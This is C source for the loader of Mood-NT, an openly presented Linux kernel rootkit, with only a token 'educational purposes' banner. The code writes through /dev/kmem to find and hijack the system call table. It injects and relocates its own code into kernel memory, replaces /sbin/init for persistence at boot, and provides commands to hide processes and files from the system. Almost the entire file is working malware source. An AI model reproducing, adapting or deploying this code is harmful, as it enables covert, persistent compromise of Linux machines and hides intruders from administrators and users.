/* 
 * User charger, read more infos in README file
 *
 * 
 * Copyright (c) 2006 Pierre Falda <darkangel@antifork.org>
 *      
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */


#include <stdio.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <rk.h>
#include <main.h>
extern int 	kernel_init(unsigned long,unsigned long);
struct {
 unsigned short not_interesting;
 unsigned int start;
} __attribute__ ((packed)) idt;

struct {
 unsigned short addr1;
 unsigned char not_interesting[4];
 unsigned short addr2;
} __attribute__ ((packed)) idt_entry;

unsigned long k_start,k_end,k_u_end;

extern char *optarg;


/* stub per la chiamata a vmalloc
 * in un kernel compilato con regparm,
 * devo farlo eseguire a kspace, mettere la size in eax e poi
 * fare una call a vmalloc
 */

static unsigned long vmalloc=0;
unsigned long regvmalloc(unsigned long size)
<%
register unsigned long vmret;
asm __volatile__ (	"vmstub:\n\r"
			"mov %0, %%eax\n\r"
			"call *vmalloc\n\r"
			: "=g"(vmret) 
			: "0"(size)
		 );
return vmret;
%>

inline char *mystrstr(char *haystack,char *needle)
<%

return (char*) memmem(haystack,strlen(haystack),needle,strlen(needle));

%>

int relocate(unsigned char *start, unsigned char *end, unsigned long base, char *from)
{
	unsigned long size=(typeof(size))(end-start);
	unsigned char *ptr;
	unsigned long *lptr;
	int relocs=0;
	base-=(unsigned long)from;
	for(ptr=(unsigned char*)start;((unsigned long)ptr)<start+size;ptr++)
	{
		lptr=(unsigned long*)ptr;
		if((*lptr>=(unsigned long)from)&&(*lptr<=(unsigned long)(from+size)))
		{
			*lptr+=base;
			ptr+=3;
			relocs++;
		}
	}
	return relocs;

}

unsigned long find_sym(int fd,struct symtable *table,int versioned)
{
	unsigned long offset,i,found=0;
	struct kernel_symbol ks;
	char *ptr,*tmp;
	char *version_banner="\t- %s...nothing, versioned mode activated, please wait\n";
	char *shit_banner="\t- %s...nothing, we've got a problem guy\n";
	char *banner=version_banner;	
	unsigned char buffer[30]={0};
	for(offset=k_start;offset<k_u_end;offset++)
	{
		rce(fd,offset,(unsigned char*)&ks,sizeof(ks));
                if((ks.name>(char*)k_start)&&(ks.name<(char*)k_end))
                {
			if((ks.value>k_start)&&(ks.value<k_end))
			{
	                        rce(fd,(unsigned long)ks.name,buffer,29);
				if((tmp=mystrstr(buffer,"_Rsmp")))
					*tmp='\0';
				if(versioned)
				{
					ptr=strrchr(buffer,'_');
					if(ptr)
						*ptr='\0';
				}
				for(i=0;i<table->used;i++)
	        	                if(!strcmp(table->names[i],buffer))
					{
						if(table->values[i])
							continue;
						table->values[i]= ks.value;
						found++;
						printf("\t- %s...FOUND! %x\n",table->names[i],ks.value);
						if(found==table->used)
							return found;
						break;
					}
			}
							
                }
        }
	if(found>0)
	{
		for(found=0;found<table->used;found++)
			if(!table->values[found])
				printf("\t- %s...NOTHING!\n",table->names[found]);
	}
	else
	<%
		if(versioned)
			banner=shit_banner;
		printf(banner,table->names[found]);
	%>

	return found;
	
}
int mycopy(unsigned char *to, unsigned char *from, unsigned long size)
{

	register int i;
	for(i=0;i<size;i++)
		*to++=*from++;
	return 0;
}

int copy_file(char *src,char*dest)
{
	int fdin,fdout,readed;
	unsigned char buffer[4096];
	if((fdin=open(src,O_RDONLY))<0)
		return fdin;
	if((fdout=open(dest,O_CREAT|O_WRONLY|O_TRUNC,0100000|00700|00040|00010|00004|00001))<0)
	{
		close(fdin);
		return fdout;
	}
	while ((readed=read(fdin,buffer,sizeof(buffer)))>0)
		if((write(fdout,buffer,readed))!=readed)
		{
			close(fdin);
			close(fdout);
			return -1;
		}
	close(fdin);
	close(fdout);
	return 0;

}
int client(char command,char *arg)
{
	struct dawn_command comm={0};
	struct utsname uts;
	short file=0;
	switch(command)
	{
		case 'R':	comm.command=uninstall;
					break;
		case 'A':	comm.command=auth;
					break;
		case 'H':	comm.command=p_hide;
					break;
		case 'U':	comm.command=p_unhide;
					break;
		case 'F':	comm.command=hidefile;
					file=1;
					break;
		case 'f':	comm.command=unhidefile;
					file=1;
					break;
	}
	if(arg)
	{
		comm.pid=atoi(optarg);
		comm.key=strtoul(optarg,NULL,16);
		if(file)
		{
			struct stat statme;
			if(stat(optarg,&statme)<0)
					goto exit_command;
			comm.pid=statme.st_ino;
		}
	}
	memcpy((void*)&uts,(void*)&comm,sizeof(comm));
	if(oldolduname(&uts)==0x31337)
	{
		if(command=='R')
		{
			unlink("/sbin/init");
			if(copy_file("/sbin/init"LINK_HIJACK_PREFIX HIDE_PREFIX,"/sbin/init")<0)
			{
					printf("Warning,system may not be bootable, check init...");
					goto exit_command;
			}
			unlink("/sbin/init"LINK_HIJACK_PREFIX HIDE_PREFIX);
			printf("Warning, your home dir won't be removed...");	
		}
		return 0;
	}
exit_command:
	return -1;
}

void help(void)
{
	printf(	"Mood's usage:\n"
	       	"-K value\tset vmalloc address\n"
	       	"-P value\tset printk address\n"
	       	"-S value\tset sys call table address\n"
	       	"-C value\tset smp_call_function address\n"
	       	"-r value\tset register_die_notifier address\n"
	       	"-D value\tset do_debug address\n"
	       	"-d\t\tstart with default values and parsers\n"
	       	"-k value\tset mood-nt's key\n"
	       	"-M value\tforce an engine: [b|l|e] for basic,legacy,elite\n"
	       	"-A key\t\tAuthenticate to Mood-NT\n"
		"-H value\tHide target pid\n"
		"-U value\tUnhide target pid\n"
		"-F path\t\tHide target file\n"
		"-f path\t\tUnhide target file\n"
		"-R\t\tRemove Mood-NT\n"
	       	"-h\t\tthis help\n"
	       );

}
int find_sym_in_proc(int kversion,struct symtable *table,int versioned)
{
	FILE *fd;
	unsigned char *fname;
	unsigned char *sname;
	unsigned char *format;
	unsigned char buffer[200];
	unsigned char dum;
	unsigned long value;
	char *version_banner="\t- %s...nothing, versioned mode activated, please wait\n";
	char *brute_banner="\t- %s...nothing, bruteforce mode activated, please wait\n";
	char *banner=version_banner;
	int ret=0,i;
	char *ptr,*tmp;
	if(kversion==6)
	{
		fname="/proc/kallsyms";
		format="%x %c %s\n";
	}
	else
	{
		fname="/proc/ksyms";
		format="%x%c%s\n";
	}
			
	
	if(!(fd=fopen(fname,"r")))
		goto err;
	while(fscanf(fd,format,&value,&dum,buffer)!=EOF)
	{
		if((tmp=mystrstr(buffer,"_Rsmp")))
			*tmp='\0';
		if(versioned)
		{
			ptr=strrchr(buffer,'_');
			if(ptr)
				*ptr='\0';
		}

		for(i=0;i<table->used;i++)
		{
			if(!(strcmp(buffer,table->names[i])))
			{
				if(table->values[i])
					continue;
				ret++;
				table->values[i]=value;
				printf("\t- %s...FOUND!\n",table->names[i]);
				
				if(ret==table->used)
				{
					fclose(fd);
					return ret;
				}
				break;
				
			}
		}
		
	}
	fclose(fd);
err:
	if(ret>0)
	{
		for(ret=0;ret<table->used;ret++)
			if(!table->values[ret])
				printf("\t- %s...NOTHING!\n",table->names[ret]);
	}
	else
	<%
		if(versioned)
			banner=brute_banner;
		printf(banner,table->names[ret]);
	%>
	return ret;	

}
void set_reboot(char *me)
{
	
	int fd;
	printf(	"Setting up for reboot:\n"
		"\tCopying init and us instead of init...");
	fflush(stdout);
		if(copy_file("/sbin/init","/sbin/init"LINK_HIJACK_PREFIX HIDE_PREFIX)<0)
			printf("ERROR! Unable to backup init\n");
		else if(unlink("/sbin/init")<0)
				printf("ERROR! Unable to remove init\n");
			else if(copy_file(me,"/sbin/init")<0)
					printf("ERROR! Unable to install myself instead of init\n");
				else 
					printf("DONE!\n\tCreating our dir...");
		if(mkdir(OUR_DIR,040000|00700)<0)
			printf("CRITIC! Unable to create our dir\n");
		else
		{
			printf("DONE!\n\tCreating init script in %s for our applications...",OUR_DIR);
			if((fd=open(OUR_DIR"/mood-nt.init",O_CREAT|O_WRONLY,0100000|00700))<0)
			{
				printf("ERROR! Unable to create our script\n");
			}
			else
			{
				write(fd,"#!/bin/bash\n#Insert here the commands to execute trough system() at boot\n",73);
				close(fd);
				printf("DONE!\n");

			}
		}


}


void poll_for_proc(void)
{
	int fd;
	int count=0;
	printf("Polling for procfs, please wait...");
	fflush(stdout);
	while (((fd=open("/proc/1",O_RDONLY))<0)&&(count++<20))
		sleep(1);
	if(fd>=0)
	{
		printf("FOUND!\n");
		close(fd);
	}
	else
		printf("NONE\n");

}

int main(int argc, char *argv[],char*envp[])
{
	int kmem_fd,backup_fd;
	int res,versioned=0;
	char *tmp;
	unsigned long int80;
	unsigned char buffer[600]={0},moodmode='\0';
	unsigned char *sct;
	unsigned long sys_call_table=0;
	unsigned long printk=0,smp_call=0,register_die=0,do_debug=0,
		      key=0;
	unsigned long regparm=0,regpvm=regvmalloc;
	unsigned long olduname;
	unsigned long kernel_mem;
	unsigned long init_start;
	unsigned long copyaddr=mycopy;
	struct start_arg start={0};
	struct utsname whoami,whowasi;
	int i,c,shalldump=0,first_start=0;
	unsigned int mypid,found=0;
	struct stat statconf;
	struct symtable syms={{0},{0},0};
	unsigned char *_argv[8]={NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL};
	mypid=getpid();
	if(mypid==1)
	{
		if(fork())
		{
			execve("/sbin/init"LINK_HIJACK_PREFIX HIDE_PREFIX,argv,envp);
			exit(-1);
		}
		else
		{
			_argv[0]=argv[0];
			_argv[1]="-d";
			_argv[2]=NULL;
			argc=2;
			freopen("/dev/null","a",stdout);
			freopen("/dev/null","a",stderr);
		}
	}
	else
		memcpy(_argv,argv,sizeof(char*)*argc);

			
	signal(SIGTRAP,SIG_IGN);

	if(stat("/sbin/init"LINK_HIJACK_PREFIX HIDE_PREFIX,&statconf)<0)
		first_start=1;
	
	/* yes, we are lame */
	if(first_start)	
		printf("\t\t************* Mood-NT Version 2.3 (beta) **************\n"
		       "\t\t*******************************************************\n"
		       "\t\t********* (bad)coded by darkangel@antifork.org ********\n"
		       "\t\t*******************************************************\n"
		       "\t\t* Written for educational purposes only, don't use it *\n"
		       "\t\t******* if you do, you are the only responsable *******\n"
		       "\t\t*******************************************************\n\n"
			);

	/* end lame section */

	/* get kernel version and reconfigure mood if necessary */
	uname(&whoami);
	

	if(!(stat(OUR_DIR"/mood-nt.conf",&statconf)<0))
	{
		if((backup_fd=open(OUR_DIR"/mood-nt.conf",O_RDONLY))>0)
		{
			if((read(backup_fd,&vmalloc,sizeof(vmalloc)))!=sizeof(vmalloc))
				vmalloc=0;
			if((read(backup_fd,&printk,sizeof(printk)))!=sizeof(printk))
				printk=0;
			if((read(backup_fd,&smp_call,sizeof(smp_call)))!=sizeof(smp_call))
				smp_call=0;
			if((read(backup_fd,&register_die,sizeof(register_die)))!=sizeof(register_die))
				register_die=0;
			if((read(backup_fd,&do_debug,sizeof(do_debug)))!=sizeof(do_debug))
				do_debug=0;
			if((read(backup_fd,&key,sizeof(key)))!=sizeof(key))
				key=0;

			if((read(backup_fd,&whowasi,sizeof(whowasi)))!=sizeof(whowasi))
				memset(&whowasi,0,sizeof(whowasi));	

			close(backup_fd);
			
		}
	}
	/* is this the same kernel? */
	if(memcmp((void*)&whoami,(void*)&whowasi,sizeof(whoami)))
		vmalloc=do_debug=printk=register_die=smp_call=0;	
	/* if we read from a conf file this is boot */
		if(argc<2)
		{
			help();
			exit(0);
		}

		while((c=getopt(argc,_argv,"M:D:P:K:S:C:k:r:hdA:H:U:RF:f:"))!=-1)
			switch((char)c)
			{
				case 'K':
						vmalloc=strtoul(optarg,NULL,16);
						shalldump=1;
						break;
				case 'S':
						sys_call_table=strtoul(optarg,NULL,16);
						break;
				case 'P':
						printk=strtoul(optarg,NULL,16);
						shalldump=1;
						break;
				case 'C':
						smp_call=strtoul(optarg,NULL,16);
						shalldump=1;
						break;
				case 'r':	register_die=strtoul(optarg,NULL,16);
						shalldump=1;
						break;
				case 'D':
						do_debug=strtoul(optarg,NULL,16);
						shalldump=1;
						break;
				case 'd':
						break;
				case 'k':	key=strtoul(optarg,NULL,16);
						shalldump=1;
						break;
				case 'M':	moodmode=*optarg;
						break;
				case 'A':
				case 'H':
				case 'U':
				case 'R':
				case 'F':
				case 'f':	if(client(c,optarg)<0)
								printf("ERROR!\n");
							else
								printf("Success!\n");
						return;
				default:
						help();
						exit(0);

			}	

	asm ("sidt %0" : "=m" (idt));
	if((kmem_fd=open("/dev/kmem",O_RDWR,S_IRWXU))<0)
	{
		printf("D'ho! Impossibile aprire kmem\n");
		exit(-1);
	}
	rce(kmem_fd,idt.start+8*0x80,&idt_entry,sizeof(idt_entry));
	int80= (idt_entry.addr2 << 16) | idt_entry.addr1;
	rce(kmem_fd,idt.start+8,&idt_entry,sizeof(idt_entry));
	start.int1=(idt_entry.addr2 << 16) | idt_entry.addr1;
	rce(kmem_fd,int80,buffer,sizeof(buffer));
	
	if(!sys_call_table)
	{
		if(!(sct=memmem(buffer,sizeof(buffer),"\xff\x14\x85",3)))
		{
			printf("D'ho! Unable to find sys_call_table!\n");
			exit(-1);
		}
		start.magic_address=int80+(((unsigned long)sct)-((unsigned long)buffer));
		start.magic_rejoin=start.magic_address+7;
		sys_call_table=*(unsigned long*)(sct+3);
		if((sct=memmem(sct+7,sizeof(buffer)-(sct-buffer)-7,"\xff\x14\x85",3)))
		{
			start.magic_ptrace_address=int80+(((unsigned long)sct)-((unsigned long)buffer));
			start.magic_ptrace_rejoin=start.magic_ptrace_address+7;
		}
		else
		{
			start.magic_ptrace_address=0xbadc0ded;
			start.magic_ptrace_rejoin=0xbadc0ded;
		}
	}

	k_start=sys_call_table&0xff000000;
	k_end=k_start|0x0f000000;
	k_u_end=k_start|0x00f00000;

	poll_for_proc();
	start.kernel_version=whoami.release[2]-'0';
	start.kernel_subversion=atoi(&whoami.release[4]);
	if((!vmalloc)||(!printk)||(!smp_call)||(!register_die)||(!do_debug))
	{
		printf("Looking for addresses:\n");
		if(!printk)
			syms.names[syms.used++]="printk";
		if(!smp_call)
			syms.names[syms.used++]="smp_call_function";
		if(!do_debug)
			syms.names[syms.used++]="do_debug";

		if((!vmalloc)||(!smp_call)||(!register_die))	
			switch(start.kernel_version)
			{
				case 6:
					if(!vmalloc)
						syms.names[syms.used++]="vmalloc";
					if(!register_die)
						syms.names[syms.used++]="register_die_notifier";
					break;
				case 4:
					if(!vmalloc)
						syms.names[syms.used++]="__vmalloc";
					break;
			}
		
			found=find_sym_in_proc(start.kernel_version,&syms,0);
			if(!found)
			<%
				found=find_sym_in_proc(start.kernel_version,&syms,1);
				if(!found)
					found=find_sym(kmem_fd,&syms,0);
				if(!found)
					found=find_sym(kmem_fd,&syms,1);

			%>
			
	
	}
	for(i=0;i<syms.used;i++)
	{
		if(!strncmp(syms.names[i],"printk",6))
			printk=syms.values[i];
		if(mystrstr(syms.names[i],"vmalloc"))
			vmalloc=syms.values[i];
		if(!strncmp(syms.names[i],"smp_call_function",17))
			smp_call=syms.values[i];
		if(!strncmp(syms.names[i],"register_die_notifier",21))
			register_die=syms.values[i];
		if(!strncmp(syms.names[i],"do_debug",8))
			do_debug=syms.values[i];
		
	}
	if((!vmalloc)||(!printk)||(!smp_call)||(!register_die)||(!do_debug))
	{
		printf("SHIT, unable to find %s! "
		       "Try looking into System.map :]\n",vmalloc?printk?smp_call?do_debug?"register_die_notifier":"do_debug":"smp_call_function":"printk":"vmalloc");
			if(!vmalloc)
			{
				exit(-1);	
			}
			else
			{
				printf("Error not fatal, continuing...\n");
			}
	}
	
	if(memmem(buffer,sizeof(buffer),"\x00\xf0\xff\xff",4))
		start.stacksize=4096;
	else
		start.stacksize=8192;
	rce(kmem_fd,sys_call_table+(__NR_olduname*4),&olduname,sizeof(olduname));
	rce(kmem_fd,vmalloc,&regparm,1);
	if(regparm!=0x8b)
		regparm=0;

	if(!regparm)
	<%
		wce(kmem_fd,sys_call_table+(__NR_olduname*4),&vmalloc,sizeof(vmalloc));	
	%>
	else
	<%
		start.regparm=1;
		wce(kmem_fd,sys_call_table+(__NR_olduname*4),&regpvm,sizeof(vmalloc));	
	%>
	
	mlockall(MCL_CURRENT|MCL_FUTURE);

	switch(start.kernel_version)
	{
		case 6:

			kernel_mem=VMALLOC6(((char*)code_end)-((char*)code_start));
			break;
		case 4:
			if(start.regparm)
			<%
				printf(	"CRITIC! Regparm in 2.4 kernels is not still supported"
					"handled, exiting...\n");
				return -1;
			%>
			kernel_mem=VMALLOC4(((char*)code_end)-((char*)code_start),GFP_KERNEL4|__GFP_HIGHMEM,__PAGE_KERNEL);
			break;

	}
	printf("Allocation at %x\n",kernel_mem);
	printf("Relocs: %d\n",relocate((char*)code_start,(char*)code_end,(unsigned long)kernel_mem,code_start));

//	printf("TEST: NOT COPYING MOOD IN MEMORY WITH STANDARD TECH\n");
	wce(kmem_fd,kernel_mem,(char*)code_start,((char*)code_end)-((char*)code_start));
//	wce(kmem_fd,sys_call_table+(__NR_olduname*4),&copyaddr,sizeof(copyaddr));
//	VMALLOC4(kernel_mem,(char*)code_start,((char*)code_end)-((char*)code_start));

	munlockall();
	if(!key)
		printf("Defaulting key to 0x%x\n",KEY);
	else
		printf("Setting key to 0x%x\n",key);
	init_start=kernel_mem+((unsigned long)kernel_init-(unsigned long)code_start);
	wce(kmem_fd,sys_call_table+(__NR_olduname*4),&init_start,sizeof(init_start));
	/***********/
	start.kernel_mem=kernel_mem;
	start.vmalloc=vmalloc;
	start.sys_call_table=sys_call_table;
	start.printk=printk;
	start.int80=int80;
	start.smp_func=smp_call;
	start.notifier=register_die;
	start.do_debug=do_debug;
	start.kstart=k_start;
	start.kend=k_end;
	start.key=key;
	start.mode=moodmode;
	tmp=strrchr(_argv[0],'/');
	if(tmp)
		tmp++;
	else
		tmp=_argv[0];
	memcpy(start.mycomm,tmp,strlen(tmp)+1);
	
	if(first_start)
		set_reboot(argv[0]);
	
	if(shalldump)
	{
		printf("\tSaving my values for further reactivations...");
		fflush(stdout);
		if((backup_fd=open(OUR_DIR"/mood-nt.conf",O_CREAT|O_WRONLY,0100000|00700))<0)
			printf("ERROR: %s\n",strerror(errno));
		else if(write(backup_fd,&start.vmalloc,sizeof(start.vmalloc))!=sizeof(start.vmalloc))
			printf("ERROR: %s\n",strerror(errno));
			else if(write(backup_fd,&start.printk,sizeof(start.printk))!=sizeof(start.printk))
				printf("ERROR: %s\n",strerror(errno));
			    	else if(write(backup_fd,&start.smp_func,sizeof(start.smp_func))!=sizeof(start.smp_func))
				     	printf("ERROR: %s\n",strerror(errno));
			         	else if(write(backup_fd,&start.notifier,sizeof(start.notifier))!=sizeof(start.notifier))
					 	printf("ERROR: %s\n",strerror(errno));
						else if(write(backup_fd,&start.do_debug,sizeof(start.do_debug))!=sizeof(start.do_debug))
							printf("ERROR: %s\n",strerror(errno));
					 		else if(write(backup_fd,&start.key,sizeof(start.key))!=sizeof(start.key))
								printf("ERROR: %s\n",strerror(errno));
					 		else 
								printf("DONE!\n");
	}
	/* ACTIVATE OURSELVES! :] */
	res=KSTART(olduname,&start);

	switch(res)
	{
		case MOOD_STANDARD:
			printf("Mood-NT ACTIVATED in standard mode\n");
			break;
		case MOOD_LEGACY:
			printf("Mood-NT ACTIVATED in elite 2.4 legacy mode\n");
			break;
		case MOOD_ELITE:
			printf("Mood-NT ACTIVATED in true elite mode\n");
			break;
		default:
			printf("Mood-NT error: %d\n",res);
			return -1;
	}
	if(!first_start)
		system(OUR_DIR"/mood-nt.init");
	return 0;
}

